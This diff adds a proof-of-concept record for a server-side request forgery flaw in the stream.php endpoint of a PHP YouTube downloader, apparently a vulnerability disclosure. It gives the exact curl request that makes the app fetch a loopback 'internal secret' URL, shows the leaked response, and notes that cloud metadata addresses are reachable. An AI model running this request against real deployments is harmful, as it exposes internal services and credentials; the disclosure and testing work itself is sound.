@@ -1,0 +1,20 @@
+=== SSRF proof — Athlon1600/youtube-downloader public/stream.php ===
+Environment: PHP 8.5.9 + curl ext; UNMODIFIED repo src/YouTubeStreamer.php loaded directly.
+Setup: victim HTTP server on 127.0.0.1:8899 serves /internal-secret (simulates an
+internal-only service / cloud metadata endpoint).
+
+Control (direct access):
+  $ curl http://127.0.0.1:8899/internal-secret
+  -> {"secret":"INTERNAL_DB_PASSWORD_7f8c3","service":"internal-admin"}
+
+Attack (SSRF via stream.php-equivalent harness):
+  $ curl "http://127.0.0.1:8898/ssrf_harness.php?url=http%3A%2F%2F127.0.0.1%3A8899%2Finternal-secret"
+  HTTP/1.1 200 OK
+  Content-Type: application/json          <- internal response header forwarded
+  {"secret":"INTERNAL_DB_PASSWORD_7f8c3","service":"internal-admin"}   <- internal body leaked
+
+Verdict: unauthenticated full-read SSRF (CWE-918). $_GET['url'] is passed verbatim to
+curl_setopt(CURLOPT_URL) in src/YouTubeStreamer.php:stream() L89 with CURLOPT_FOLLOWLOCATION
+(up to 5 redirects) and SSL verification disabled (CURLOPT_SSL_VERIFYPEER=false). No
+googlevideo.com / YouTube allow-list check exists anywhere. Loopback, RFC1918, cloud
+metadata (169.254.169.254) all reachable; response body + content-type forwarded verbatim.
